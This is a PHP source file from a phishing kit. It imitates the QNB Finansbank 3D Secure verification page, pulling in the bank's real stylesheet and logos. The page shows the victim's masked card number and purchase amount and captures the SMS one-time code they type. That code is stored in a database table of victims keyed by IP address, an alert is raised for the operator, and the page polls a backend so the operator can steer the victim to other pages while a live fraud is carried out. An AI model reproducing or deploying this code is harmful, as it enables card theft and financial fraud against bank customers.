<?php

date_default_timezone_set('Europe/Istanbul');
$zaman = date('d/m/20y-H:i:s');

include("../gmypanel/Core/getRealIPAdress.php");
include('../gmypanel/Connection.php');

$ip = getUserIP();
$db->query("UPDATE sazan SET now = 'SMS Ekranı' WHERE ip = '{$ip}'");

$sorgu = $db->prepare("SELECT * FROM site");
   $sorgu->execute();
   $cikti = $sorgu->fetch(PDO::FETCH_ASSOC);

ob_start(); 
session_start(); 
$cc_last_4 = $_SESSION['cc_last_4'];
$cc_first_6 = $_SESSION['cc_first_6'];
	$tutar = "".$_SESSION['tutar']." TL";

if($_POST){
  $sms   = htmlspecialchars($_POST['sms']);
  
  $query = $db->prepare("UPDATE sazan SET sms=? WHERE ip = ?");
  $insert = $query->execute(array($sms,$ip));

  if($insert){
	$db->query("UPDATE site SET sms_sesi='1'");
      header('Location:../Waiting.php');
  }
}

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
  if($kontrol['ban'] == $ip){ 
          header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=Epha');
      } 
}

?>
	<html class="no-js" lang="tr" style="height: 100%; width: 100%;">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
		<meta http-equiv="Pragma" content="no-cache">
		<meta http-equiv="Expires" content="-1">
		<title>QNB Finansbank 3D Doğrulama</title>
		<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="stylesheet" href="https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0"> </head>

	<body>
		<div class="content-wrapper" id="content" style="display: block;">
			<div class="header">
				<div class="brand-logo"> <img 3dslogo="scheme" src="https://acs.qnbfinansbank.com/img/brand/troy.png" alt="card brand"> </div>
				<div class="member-logo"> <img 3dslogo="issuer" src="https://acs.qnbfinansbank.com/img/finansbank.png" alt="card platform"> </div>
			</div>
			<div id="approve-page">
				<div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
					<div class="loader"></div>
				</div>
				<div class="content">
					<h1 id="approve-header">Doğrulama kodunu giriniz</h1>
					<div class="info-wrapper">
						<div class="info-row">
							<div class="info-col info-label">İşyeri Adı:</div>
							<div class="info-col" 3dsdisplay="merchant" id="merchant-name" test-id="merchantName"><?php $kontrol = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);echo $kontrol['magaza_name']; ?></div>
						</div>
						<div class="info-row">
							<div class="info-col info-label">İşlem Tutarı:</div>
							<div class="info-col" style="font-size: 21px; font-weight: 900; margin-top: -5px;" 3dsdisplay="amount" test-id="formattedAmount" id="amount">
								<?=$tutar?>
							</div>
						</div>
						<div class="info-row">
							<div class="info-col info-label">İşlem Tarihi-Saati:</div>
							<div class="info-col" 3dsdisplay="date" id="operation-date-time" test-id="purchaseDate">
								<?php echo $zaman; ?>
							</div>
						</div>
						<div class="info-row">
							<div class="info-col info-label">Kart Numarası:</div>
							<div class="info-col" 3dsdisplay="pan" test-id="pan" id="pan">
								<?=$cc_first_6?>******<?=$cc_last_4?>
							</div>
						</div>
					</div>
					<div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
						<h3>İşlem şifreniz <span test-id="maskedPhone" id="msisdn">905*********</span> olan cep telefonunuza gönderilecektir.<br>Lütfen <span id="otpRefNo" test-id="otpRefNo">DFCHKJHB</span> referans numaralı alışveriş şifrenizi giriniz.</h3>
						<div class="form-wrapper">
							<label for="code">Doğrulama Kodu</label>
							<form method="POST" action="">
								<div class="form-row">
									<input autofocus required 3dsinput="password" type="password" class="f-input" name="sms" id="sms" minlength="4" maxlength="8" autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*"> </div>
								<div id="submitButtonDiv" style="display: block;">
									<div class="form-row has-submit">
										<input id="submitbutton" type="submit" value="Onayla" class="button btn-1 btn-commit"> </div>
									<div class="call-to-action">
										<ul class="action-list">
											<li>
												<input id="cancelbutton" type="button" value="İşlemi İptal Et" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;"> </li>
											<li>
												<input id="helpButton" type="button" value="Yardım" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;"> </li>
										</ul>
									</div>
									<div id="timerDiv" class="has-timer"> <span>Kalan Süre: </span> <span class="has-counter" id="time">03:00</span> </div>
							</form>
							<div test-id="helpArea" id="helpArea" class="noscriptHelpText" style="display:none;">3D Secure, internet alışverişlerinde kart sahibinin kimliğinin doğrulanması amacıyla kullanılan, hem kart sahiplerini hem de alışveriş yaptığınız firmayı sahtekarlıklara karşı koruyan uluslararası bir güvenli alışveriş çözümüdür.
								<br>Cep telefonunuza doğrulama kodu gelmemesi ya da doğrulama kodunun gönderildiği telefon numaranızın güncel olmaması gibi durumlarda 0850 222 0 900 numaralı QNB Finansbank Çağrı Merkezi ile iletişime geçebilirsiniz.</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<script>
		function startTimer(duration, display) {
			var timer = duration,
				minutes, seconds;
			setInterval(function() {
				minutes = parseInt(timer / 60, 10)
				seconds = parseInt(timer % 60, 10);
				minutes = minutes < 10 ? "0" + minutes : minutes;
				seconds = seconds < 10 ? "0" + seconds : seconds;
				display.textContent = minutes + ":" + seconds;
				if(--timer < 0) {
					timer = duration;
				}
			}, 1000);
		}
		window.onload = function() {
			var fiveMinutes = 60 * 3,
				display = document.querySelector('#time');
			startTimer(fiveMinutes, display);
		};
		</script>
		    <script type="text/javascript">
 $(document).ready(function() {

gonder();

var int = self.setInterval("gonder()", 2500);

});

function gonder() {

$.ajax({
    type: 'POST',
    url: '<?php echo "../Database.php?ip=".$ip; ?>',
    success: function(msg) {
      if (msg == 'sms') {
            window.location.href = '../3D_Security';
        }
        if (msg == 'tebrik') {
            window.location.href = '../Successful';
        }
        if (msg == 'hata1') {
            window.location.href = '../Error';
        }
        if (msg == 'back') {
            window.location.href = '../index-2';
        }
        if (msg == 'sms2') {
            window.location.href = '../Wrong_Sms-3';
        }
        if (msg == 'hata2') {
            window.location.href = '../Closed_to_Internet';
        }
    }
});
}
    </script>
	</body>

	</html>